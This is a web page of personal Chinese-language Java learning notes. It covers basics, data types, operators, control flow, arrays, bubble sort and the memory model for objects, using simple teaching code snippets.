<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>JAVA学习笔记 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="JAVA学习笔记" />
<meta property="og:description" content="文章目录 一、JAVA概述1. 基础2. 转义字符：3. 注释4. 常见错误 二、变量1. &#43;号的使用2. 数据类型浮点数使用陷阱：字符型 3. 数据类型转换a. 自动数据类型转换b. 强制类型转换 三、运算符1. 算术运算符2. 关系运算符3. 逻辑运算符4. 赋值运算符5. 三元运算符6. 运算符优先级7. 标识符命名规则和规范8. 进制（很重要的基本功）9. 反码补码原码 四、控制结构1. Switch语句2. for循环for循环的执行顺序 3. 多重循环 五、数组、排序和查找1. 数组数组初始化：数组注意细节数组赋值（*）![在这里插入图片描述](https://img-blog.csdnimg.cn/5e97417778b541fc91c459e82e36993d.png)二维数组的内存形式 2. 排序冒泡排序 六、面向对象（基础）1. 类与对象对象在内存中存在形式(*）类和对象的内存分配机制（*）方法调用机制方法传参机制（*） 2. 递归3. 方法重载4. 可变参数5. 作用域6. 构造器/构造方法构造器细节含构造器的对象创建流程分析 7. this8. 本章习题 七、面向对象（中级）1. IDEA常用快捷键模板 2. 包3. 访问修饰符4. 封装（*）5. 继承（*）继承的本质（**）super关键字方法重写/覆盖 6. 多态对象的多态（*）![在这里插入图片描述](https://img-blog.csdnimg.cn/a1b953f32ac54c729542cdee31b2ae4c.png)instanceOf动态绑定机制（**）多态数组多态参数 7. Object类==和equals的区别toString 8. 断点调试 八、面向对象（高级）1. 类变量和类方法类变量类方法 2. main方法IDEA给main传参数 3. 代码块4. final5. 抽象类6. 接口7. 内部类1. 局部内部类2. 匿名内部类3. 成员内部类4. 静态内部类 一、JAVA概述 1." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/762ee526d3243c8b8dc0999bb80207e9/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-02-28T15:45:10+08:00" />
<meta property="article:modified_time" content="2023-02-28T15:45:10+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">JAVA学习笔记</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#JAVA_2" rel="nofollow">一、JAVA概述</a></li><li><ul><li><a href="#1__3" rel="nofollow">1. 基础</a></li><li><a href="#2__13" rel="nofollow">2. 转义字符：</a></li><li><a href="#3__33" rel="nofollow">3. 注释</a></li><li><a href="#4__51" rel="nofollow">4. 常见错误</a></li></ul> 
  </li><li><a href="#_57" rel="nofollow">二、变量</a></li><li><ul><li><a href="#1__58" rel="nofollow">1. +号的使用</a></li><li><a href="#2__60" rel="nofollow">2. 数据类型</a></li><li><ul><li><a href="#_73" rel="nofollow">浮点数使用陷阱：</a></li><li><a href="#_78" rel="nofollow">字符型</a></li></ul> 
   </li><li><a href="#3__110" rel="nofollow">3. 数据类型转换</a></li><li><ul><li><a href="#a__111" rel="nofollow">a. 自动数据类型转换</a></li><li><a href="#b__122" rel="nofollow">b. 强制类型转换</a></li></ul> 
  </li></ul> 
  </li><li><a href="#_128" rel="nofollow">三、运算符</a></li><li><ul><li><a href="#1__129" rel="nofollow">1. 算术运算符</a></li><li><a href="#2__146" rel="nofollow">2. 关系运算符</a></li><li><a href="#3__149" rel="nofollow">3. 逻辑运算符</a></li><li><a href="#4__161" rel="nofollow">4. 赋值运算符</a></li><li><a href="#5__171" rel="nofollow">5. 三元运算符</a></li><li><a href="#6__174" rel="nofollow">6. 运算符优先级</a></li><li><a href="#7__177" rel="nofollow">7. 标识符命名规则和规范</a></li><li><a href="#8__189" rel="nofollow">8. 进制（很重要的基本功）</a></li><li><a href="#9__199" rel="nofollow">9. 反码补码原码</a></li></ul> 
  </li><li><a href="#_202" rel="nofollow">四、控制结构</a></li><li><ul><li><a href="#1_Switch_203" rel="nofollow">1. Switch语句</a></li><li><a href="#2_for_206" rel="nofollow">2. for循环</a></li><li><ul><li><a href="#for_211" rel="nofollow">for循环的执行顺序</a></li></ul> 
   </li><li><a href="#3__215" rel="nofollow">3. 多重循环</a></li></ul> 
  </li><li><a href="#_222" rel="nofollow">五、数组、排序和查找</a></li><li><ul><li><a href="#1__223" rel="nofollow">1. 数组</a></li><li><ul><li><a href="#_240" rel="nofollow">数组初始化：</a></li><li><a href="#_258" rel="nofollow">数组注意细节</a></li><li><a href="#httpsimgblogcsdnimgcn5e97417778b541fc91c459e82e36993dpng_267" rel="nofollow">数组赋值（*）![在这里插入图片描述](https://img-blog.csdnimg.cn/5e97417778b541fc91c459e82e36993d.png)</a></li><li><a href="#_275" rel="nofollow">二维数组的内存形式</a></li></ul> 
   </li><li><a href="#2__278" rel="nofollow">2. 排序</a></li><li><ul><li><a href="#_279" rel="nofollow">冒泡排序</a></li></ul> 
  </li></ul> 
  </li><li><a href="#_285" rel="nofollow">六、面向对象（基础）</a></li><li><ul><li><a href="#1__286" rel="nofollow">1. 类与对象</a></li><li><ul><li><a href="#_292" rel="nofollow">对象在内存中存在形式(*）</a></li><li><a href="#_297" rel="nofollow">类和对象的内存分配机制（*）</a></li><li><a href="#_303" rel="nofollow">方法调用机制</a></li><li><a href="#_308" rel="nofollow">方法传参机制（*）</a></li></ul> 
   </li><li><a href="#2__311" rel="nofollow">2. 递归</a></li><li><a href="#3__312" rel="nofollow">3. 方法重载</a></li><li><a href="#4__317" rel="nofollow">4. 可变参数</a></li><li><a href="#5__326" rel="nofollow">5. 作用域</a></li><li><a href="#6__330" rel="nofollow">6. 构造器/构造方法</a></li><li><ul><li><a href="#_345" rel="nofollow">构造器细节</a></li><li><a href="#_347" rel="nofollow">含构造器的对象创建流程分析</a></li></ul> 
   </li><li><a href="#7_this_350" rel="nofollow">7. this</a></li><li><a href="#8__359" rel="nofollow">8. 本章习题</a></li></ul> 
  </li><li><a href="#_361" rel="nofollow">七、面向对象（中级）</a></li><li><ul><li><a href="#1_IDEA_362" rel="nofollow">1. IDEA</a></li><li><ul><li><a href="#_363" rel="nofollow">常用快捷键</a></li><li><a href="#_377" rel="nofollow">模板</a></li></ul> 
   </li><li><a href="#2__379" rel="nofollow">2. 包</a></li><li><a href="#3__387" rel="nofollow">3. 访问修饰符</a></li><li><a href="#4__393" rel="nofollow">4. 封装（*）</a></li><li><a href="#5__398" rel="nofollow">5. 继承（*）</a></li><li><ul><li><a href="#_412" rel="nofollow">继承的本质（**）</a></li><li><a href="#super_424" rel="nofollow">super关键字</a></li><li><a href="#_428" rel="nofollow">方法重写/覆盖</a></li></ul> 
   </li><li><a href="#6__433" rel="nofollow">6. 多态</a></li><li><ul><li><a href="#httpsimgblogcsdnimgcna1b953f32ac54c729542cdee31b2ae4cpng_437" rel="nofollow">对象的多态（*）![在这里插入图片描述](https://img-blog.csdnimg.cn/a1b953f32ac54c729542cdee31b2ae4c.png)</a></li><li><a href="#instanceOf_456" rel="nofollow">instanceOf</a></li><li><a href="#_463" rel="nofollow">动态绑定机制（**）</a></li><li><a href="#_467" rel="nofollow">多态数组</a></li><li><a href="#_470" rel="nofollow">多态参数</a></li></ul> 
   </li><li><a href="#7_Object_472" rel="nofollow">7. Object类</a></li><li><ul><li><a href="#equals_473" rel="nofollow">==和equals的区别</a></li><li><a href="#toString_479" rel="nofollow">toString</a></li></ul> 
   </li><li><a href="#8__484" rel="nofollow">8. 断点调试</a></li></ul> 
  </li><li><a href="#_490" rel="nofollow">八、面向对象（高级）</a></li><li><ul><li><a href="#1__491" rel="nofollow">1. 类变量和类方法</a></li><li><ul><li><a href="#_493" rel="nofollow">类变量</a></li><li><a href="#_499" rel="nofollow">类方法</a></li></ul> 
   </li><li><a href="#2_main_502" rel="nofollow">2. main方法</a></li><li><ul><li><a href="#IDEAmain_506" rel="nofollow">IDEA给main传参数</a></li></ul> 
   </li><li><a href="#3__511" rel="nofollow">3. 代码块</a></li><li><a href="#4_final_524" rel="nofollow">4. final</a></li><li><a href="#5__529" rel="nofollow">5. 抽象类</a></li><li><a href="#6__535" rel="nofollow">6. 接口</a></li><li><a href="#7__543" rel="nofollow">7. 内部类</a></li><li><ul><li><a href="#1__546" rel="nofollow">1. 局部内部类</a></li><li><a href="#2__549" rel="nofollow">2. 匿名内部类</a></li><li><a href="#3__562" rel="nofollow">3. 成员内部类</a></li><li><a href="#4__564" rel="nofollow">4. 静态内部类</a></li></ul> 
  </li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h2><a id="JAVA_2"></a>一、JAVA概述</h2> 
<h3><a id="1__3"></a>1. 基础</h3> 
<p>javac = java compiler（java编译器）</p> 
<p>JVM（java virtual machine虚拟机）&lt; JRE（java Runtime Environment运行环境）&lt;JDK(java Development Kit 开发工具包)</p> 
<p>java Hello.class会报错，因为会认为运行的是java.class这个类，直接java class即可<br> 原始文件.java被称为源文件；javac编译后的文件.class被称为<strong>字节码文件</strong></p> 
<p>一个源文件只能有一个public类，且这个类名要和文件名一致。其他类的数量不限，编译的时候每个类都会生成一个class文件，其他类里也可以写main函数，只要运行指定类即可</p> 
<h3><a id="2__13"></a>2. 转义字符：</h3> 
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ChangeChar</span><span class="token punctuation">{<!-- --></span>

	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
		<span class="token comment">// \t是制表符  对齐</span>
		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"上海\t北京\t成都\t深圳"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// \n是换行，光标到下一行</span>
		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"红楼梦\n三国演义\n西游记"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// \"\'实现双单引号</span>
		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"我说\"这绝不可能\"，你说：\'不一定\'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// \\是单斜杠 \\\\是双斜杠 一个\转移后面一个斜杠</span>
		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"C:\\D:\\\\E"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// \r是回车，光标回到该行最前面  开始覆盖</span>
		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"回车是替换掉该行前面的字\rHuiC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/ea/76/CdVPd268_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="3__33"></a>3. 注释</h3> 
<p>多行注释里面不能嵌套多行注释</p> 
<p>文档注释：</p> 
<pre><code class="prism language-java"><span class="token comment">/**
 * @author lixianzhuang
 * @version 1.0
 */</span>
</code></pre> 
<p>@的名词必须是指定的那几个，利用</p> 
<pre><code class="prism language-java">javadoc <span class="token operator">-</span>d <span class="token class-name">D</span><span class="token operator">:</span>\\temp\ <span class="token operator">-</span>author <span class="token operator">-</span>version <span class="token class-name">ChangeChar</span><span class="token punctuation">.</span>java
</code></pre> 
<p>其中，D:\temp\是要生成的index网页存放的地址， -author -version是所@的字段，编辑的文件是源文件，而非字节码文件，打开temp下面的index.html文件，可以看到如图：<br> <img src="https://images2.imgbox.com/37/29/2WXeTuKy_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="4__51"></a>4. 常见错误</h3> 
<ol><li>编译或者运行时，找不到文件 javac Hell0.java, 把文件名或者目录找对</li><li>主类名和文件名不一致 , 修改时保持一致即可</li><li>缺少;</li><li>拼写错误，比如 1 -&gt; l 0-&gt;0, void -&gt; viod , 要求写代码时，一定要小心</li></ol> 
<h2><a id="_57"></a>二、变量</h2> 
<h3><a id="1__58"></a>1. +号的使用</h3> 
<p><img src="https://images2.imgbox.com/19/1b/jcHTfrfh_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="2__60"></a>2. 数据类型</h3> 
<p><img src="https://images2.imgbox.com/44/5c/QeVGrQkH_o.png" alt="在这里插入图片描述"><br> 整型默认int（空间节省4字节），声明long，数字后面必须加L（或l）<br> 因为浮点型尾数部分可能丢失，造成精度损失，所以小数都是近似值<br> 浮点型默认是double型（因为精度更高），声明float型号要加f或F</p> 
<p>j<strong>ava中null只能被装换成引用类型，所以不能把null的值赋给以上的几种基本数据类型</strong></p> 
<pre><code class="prism language-java"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10L</span> <span class="token comment">// 错误，因为大数10L不能放进小int里</span>
<span class="token keyword">double</span> b <span class="token operator">=</span> <span class="token number">1.1F</span> <span class="token comment">// 正确，因为小数1.1F可以放进大double里</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/aa/28/sBB2ROCa_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_73"></a>浮点数使用陷阱：</h4> 
<p><img src="https://images2.imgbox.com/03/ba/7uyk05aR_o.png" alt="在这里插入图片描述"><br> 所以含有运算的浮点数进行判断时应该让两个数的差值的绝对值小于某个精度。<br> 如果是查询到的小数或者是直接赋值，则可以判断相等。</p> 
<h4><a id="_78"></a>字符型</h4> 
<p>char 可以直接放数字，但是表示的是数字的ASCII码</p> 
<pre><code class="prism language-java"><span class="token keyword">char</span> c <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">;</span>
</code></pre> 
<p>打印出来是a，而不是97<br> 字符类型都需要用<strong>单引号</strong>引起来，使用了<strong>双引号表示的是字符串</strong><br> char字符本质存的就是字符所对应的Unicode数字，默认输出是字符，也可以进行数据类型转换输出数字</p> 
<pre><code class="prism language-java"><span class="token keyword">char</span> c <span class="token operator">=</span> <span class="token char">'a'</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>输出是97</p> 
<p>字符加法：<br> 因为字符存的是数字，所以相加是存放的数字相加<br> <img src="https://images2.imgbox.com/14/fb/8ZrehV6L_o.png" alt="在这里插入图片描述"><br> 如果相加后的数字还是存为char类型，那就默认输出ASCII码，否则就是单纯的数字相加。<br> char本质存放的就是字母对应的ASCII码数字<br> <img src="https://images2.imgbox.com/65/24/kufTx1ko_o.png" alt="在这里插入图片描述"></p> 
<p><strong>双引号的字符串相加才是拼接！</strong></p> 
<p>JAVA的布尔类型只能用true和false，不能用数字，这点不同于C</p> 
<p><strong>PS：JAVA中字符串不能用==比较是否相等，==比较的是地址，应该用a.equals(b)来判断ab字符串是否相等。</strong><br> 最好是把具体的字符串作为a，不具体的作为b，可以避免空指针<br> <strong>但是字符型可以直接用==判断相等，反而不能用equals</strong></p> 
<h3><a id="3__110"></a>3. 数据类型转换</h3> 
<h4><a id="a__111"></a>a. 自动数据类型转换</h4> 
<p><img src="https://images2.imgbox.com/0b/31/7kGwXclD_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/8d/61/KxAk566Z_o.png" alt="在这里插入图片描述"><br> <strong>相互计算，大包容小</strong><br> <img src="https://images2.imgbox.com/97/ef/kRGOLoCe_o.png" alt="在这里插入图片描述"><br> 不同类型变量在计算的时候会先变成最大的类型，再计算，所以n1+1.1（1.1默认类型是double）的和的数据类型是double，所以定义float类型会出错。只能用大数据类型接收小的<br> <strong>byte直接看数值大小</strong><br> <img src="https://images2.imgbox.com/93/6f/xvc0jW90_o.png" alt="在这里插入图片描述"><br> char，short，byte三个类型不能自动转换，但是可以计算，先统一转化为int类型<br> <strong>即使是byte+byte，结果也是int类型！！！</strong></p> 
<h4><a id="b__122"></a>b. 强制类型转换</h4> 
<p>大----&gt;小，有数据损失</p> 
<p>其他类型强制转字符串，只需要直接+“”即可<br> <strong>字符串类型转其他，需要调用包装类，不能直接（int）转</strong><br> <img src="https://images2.imgbox.com/dc/fc/CcBUy19z_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_128"></a>三、运算符</h2> 
<h3><a id="1__129"></a>1. 算术运算符</h3> 
<p><strong>除法</strong><br> JAVA没有整除这个专门的语法，除法结果是小数还是整数完全<strong>取决于参与运算的数据类型</strong>。<br> <img src="https://images2.imgbox.com/de/67/ucwwEif1_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-java"><span class="token keyword">double</span> b <span class="token operator">=</span> <span class="token number">10</span> <span class="token operator">/</span> <span class="token number">4</span> <span class="token comment">//结果是2.0  10和4产生结果2 2是double类型  所以结果2.0</span>
</code></pre> 
<pre><code class="prism language-java">b <span class="token operator">=</span> <span class="token operator">++</span>a <span class="token comment">// 先++再赋值</span>
b <span class="token operator">=</span> a<span class="token operator">++</span> <span class="token comment">// 先赋值再++</span>
</code></pre> 
<p><strong>面试题</strong><br> <img src="https://images2.imgbox.com/0f/10/MTEC5VYA_o.png" alt="在这里插入图片描述"><br> 区别在于先赋值还是先++，先赋值会先调用一个临时变量tmp存放原始值，先++则是先+1再调用临时变量</p> 
<h3><a id="2__146"></a>2. 关系运算符</h3> 
<p>instanceof 是否是某个类的对象</p> 
<h3><a id="3__149"></a>3. 逻辑运算符</h3> 
<p>和关系运算符一样，结果都是Boolean值<br> &amp;&amp;短路与：如果第一个条件为 false，则第二个条件不会判断，效率高<br> &amp; 逻辑与：不管第一个条件是否为 false，第二个条件都要判断，效率低</p> 
<p>a^b:ab异或</p> 
<pre><code class="prism language-java"><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">++</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token comment">// 先比较再++，所以是False</span>
</code></pre> 
<h3><a id="4__161"></a>4. 赋值运算符</h3> 
<p>复合赋值运算符会自动进行类型转换</p> 
<pre><code class="prism language-java"><span class="token keyword">byte</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
b <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">// 相当于 b = (byte)(b + 3)</span>
b<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// 相当于 b = (byte)(b + 1)</span>
</code></pre> 
<p>都不会报错</p> 
<h3><a id="5__171"></a>5. 三元运算符</h3> 
<p>条件？表达式1：表达式2；<br> 条件为真，返回表达式1（一真大师）</p> 
<h3><a id="6__174"></a>6. 运算符优先级</h3> 
<p><img src="https://images2.imgbox.com/3d/11/QTcGOOVy_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/ef/f4/ZspFuA1t_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="7__177"></a>7. 标识符命名规则和规范</h3> 
<p><strong>规则：</strong><br> 只能由英文字母，数字，<strong>_ 和$这俩特殊字符</strong>组成<br> <strong>规范：</strong><br> 1)包名：多单词组成时所有字母都小写：aaa.bbb.ccc //比如 com.hsp.crm<br> 2) 类名、接口名：多单词组成时，所有单词的首字母大写：XxxYyyZzz [大驼峰]<br> 比如： TankShotGame<br> 3) 变量名、方法名：多单词组成时，第一个单词首字母小写，第二个单词开始每个单词首字母大写：xxxYyyZzz [小<br> 驼峰， 简称 驼峰法]<br> 比如： tankShotGame<br> 4) 常量名：所有字母都大写。多单词时每个单词用下划线连接：XXX_YYY_ZZZ<br> 比如 ：定义一个所得税率 TAX_RAT</p> 
<h3><a id="8__189"></a>8. 进制（很重要的基本功）</h3> 
<p>8进制是0开头；16进制是0x开头</p> 
<p>十进制转二进制：<br> <img src="https://images2.imgbox.com/18/51/0AQi3eXn_o.png" alt="在这里插入图片描述"><br> 八进制和十六进制转二进制同理<br> 二进制转八进制/十六进制：<br> 从低位开始,将二进制数每三/四位一组，转成对应的八进制/十六进制数即可<br> 八进制和十六进制转二进制反过来即可。</p> 
<h3><a id="9__199"></a>9. 反码补码原码</h3> 
<p>七八条尤为重要：<strong>进行位运算的时候，先都转化为补码进行运算，然后将结果变为原码进行输出！</strong><br> <img src="https://images2.imgbox.com/4d/78/i5XgYx1X_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_202"></a>四、控制结构</h2> 
<h3><a id="1_Switch_203"></a>1. Switch语句</h3> 
<p>如果没有break，会直接继续到下一个case的语句，而不判断下一个case的表达式是否满足，直至遇到break或者运行完switch语句，这种现象称为<strong>穿透</strong><br> <img src="https://images2.imgbox.com/38/ac/TkrZ0ETQ_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="2_for_206"></a>2. for循环</h3> 
<ol><li>循环条件是返回一个布尔值的表达式</li><li>for(;循环判断条件;) 中的初始化和变量迭代可以写到其它地方，但是两边的<strong>分号不能省略</strong>。如果需要调用i，则<strong>需要在for循环外面定义i</strong>，所以有时候不会把初始化和迭代写在for内</li><li>循环初始值可以有多条初始化语句，但要求类型一样，并且中间用逗号隔开，循环变量迭代也可以有多条变量迭代语句，中间用逗号隔开。</li></ol> 
<h4><a id="for_211"></a>for循环的执行顺序</h4> 
<p><img src="https://images2.imgbox.com/cf/8f/tEoubN8q_o.png" alt="在这里插入图片描述"><br> 先初始化，再判断条件，再<strong>执行语句，最后再进行变量迭代（自增等）</strong><br> <img src="https://images2.imgbox.com/a8/49/uefR22Mk_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="3__215"></a>3. 多重循环</h3> 
<p>break细节<br> <img src="https://images2.imgbox.com/5a/e9/aUu5rJz8_o.png" alt="在这里插入图片描述"><br> continue跳出本次循环。<br> 注意：continue跳出循环时，循环初始化不会重置，实际是跳到下一次循环的<strong>循环条件</strong>那里。</p> 
<p>return 表示跳出所在的方法，如果 return 写在 main 方法，直接退出程序</p> 
<h2><a id="_222"></a>五、数组、排序和查找</h2> 
<h3><a id="1__223"></a>1. 数组</h3> 
<p><code>double[] hen = {1,2,3,4,5}//中括号即可以这样写，也可以写在hen后面，两种写法等价</code><br> 数组长度hen.length <strong>无括号</strong><br> 二维数组声明三种形式</p> 
<blockquote> 
 <p>int[][] arr / int arr[][] / int[] arr[] 注意第三种也可以的</p> 
</blockquote> 
<p>举例：int[] x, y[]<br> x是一维数组，y是二维数组<br> <strong>数组判断：</strong></p> 
<pre><code class="prism language-java"><span class="token number">1.</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> str <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{<!-- --></span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment">// 对  可以这样初始化</span>
<span class="token number">2.</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> str <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">{<!-- --></span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment">// 错  这样初始化不能加长度</span>
<span class="token number">3.</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> str <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{<!-- --></span><span class="token char">'1'</span><span class="token punctuation">,</span> <span class="token char">'2'</span><span class="token punctuation">,</span> <span class="token char">'3'</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment">// 错，不能把char给String，这俩不是int-&gt;double的包容关系</span>
</code></pre> 
<h4><a id="_240"></a>数组初始化：</h4> 
<p>一维</p> 
<blockquote> 
 <p>动态1: double scores[] = new double[5];//数据类型 数组名[] = new 数据类型[数组长度]<br> 动态2: double scores[];<br> scores = new double[5];// 先声明后分配空间<br> 静态: double scores[] = {1,2,3}; // 知道所有值<br> <strong>动态方法别忘了加new</strong></p> 
</blockquote> 
<p>二维</p> 
<blockquote> 
 <p>动态1：类型 数组名[][] =new 类型[大小][大小]<br> 动态2：先声明后分配地址 int arr[][];<br> arr = new int[3][4];<br> 动态3：列数不确定 int arr[][] = new int[3][];<br> 先空着一维数组长度，<strong>后面必须再分别给一维数组开空间</strong><br> 静态： double int[][] = {<!-- -->{1,2,3}, {2,3,4}} // 两个中括号</p> 
</blockquote> 
<h4><a id="_258"></a>数组注意细节</h4> 
<ol><li>数组是多个相同类型数据的组合，实现对这些数据的统一管理</li><li>数组中的元素可以是任何数据类型，包括基本类型和引用类型，但是不能混用。</li><li>数组创建后，如果没有赋值，有默认值<br> int 0，short 0, byte 0, long 0, float 0.0,double 0.0，char \u0000，boolean false，String null</li><li>使用数组的步骤 1. 声明数组并开辟空间 2 给数组各个元素赋值 3 使用数组</li><li>数组的下标是从 0 开始的。</li><li>数组下标必须在指定范围内使用，否则报：下标越界异常</li></ol> 
<h4><a id="httpsimgblogcsdnimgcn5e97417778b541fc91c459e82e36993dpng_267"></a>数组赋值（*）<img src="https://images2.imgbox.com/a8/48/vjvZ4GgI_o.png" alt="在这里插入图片描述"></h4> 
<p>不同于变量赋值，数组赋值是<strong>地址赋值，新数组的改变会导致旧数组跟着发生改变</strong><br> 地址赋值也叫引用赋值，引用传递，引用拷贝<br> 变量存在栈里，存的是值；<br> 数组存在堆里，存的是地址。<br> arr[i] 和arr[j]互换数值需要使用临时变量，不能像python直接换</p> 
<p>数组扩容比较麻烦，每次需要重新开辟空间，链表扩容则更方便</p> 
<h4><a id="_275"></a>二维数组的内存形式</h4> 
<p><img src="https://images2.imgbox.com/ab/3c/JsaR4r0I_o.png" alt="在这里插入图片描述"><br> 二维数组的每个元素里放的是一维数组的地址，再通过每个地址获取基本元素</p> 
<h3><a id="2__278"></a>2. 排序</h3> 
<h4><a id="_279"></a>冒泡排序</h4> 
<p><img src="https://images2.imgbox.com/f7/dd/EzfF9efe_o.png" alt="在这里插入图片描述"><br> 冒泡排序一共要进行(n-1)次循环,每一次循环都要进行当前n-1次比较<br> 所以一共的比较次数是:<br> (n-1) + (n-2) + (n-3) + … + 1 = n*(n-1)/2;<br> 所以冒泡排序的时间复杂度是 <strong>O(n2)</strong></p> 
<h2><a id="_285"></a>六、面向对象（基础）</h2> 
<h3><a id="1__286"></a>1. 类与对象</h3> 
<p>类就是一种数据类型；对象是一个类的实例<br> 类中：属性=成员变量=字段，三种说法等价<br> 属性的定义语法同变量，示例：访问修饰符 属性类型 属性名;<br> 访问修饰符： 控制属性的访问范围<br> 有四种访问修饰符 public, proctected, 默认（不写即默认）, private</p> 
<h4><a id="_292"></a>对象在内存中存在形式(*）</h4> 
<p><img src="https://images2.imgbox.com/9b/83/X9nDSCZw_o.png" alt="在这里插入图片描述"></p> 
<ol><li>对象和数组一样，都是引用类型，指向一个地址</li><li>对象中的属性和行为如果是基本数据类型，直接存放在堆里，否则指向方法区的常量池的地址</li><li>new一个对象时，会把这个类的信息加载到方法区（一个类只会加载一次）</li></ol> 
<h4><a id="_297"></a>类和对象的内存分配机制（*）</h4> 
<p><img src="https://images2.imgbox.com/2b/b0/p6ad705Y_o.png" alt="在这里插入图片描述"><br> Java 内存的结构分析</p> 
<ol><li>栈： 一般存放基本数据类型(局部变量)</li><li>堆： 存放对象(Cat cat , 数组等)<strong>每次new都会在堆里产生一个新的对象</strong></li><li>方法区：常量池(常量，比如字符串)， 类加载信</li></ol> 
<h4><a id="_303"></a>方法调用机制</h4> 
<p><img src="https://images2.imgbox.com/2d/b7/hqVv8SWi_o.png" alt="在这里插入图片描述"><br> return之后，临时开辟的getSum栈空间被销毁；</p> 
<p>方法里面不能嵌套方法</p> 
<h4><a id="_308"></a>方法传参机制（*）</h4> 
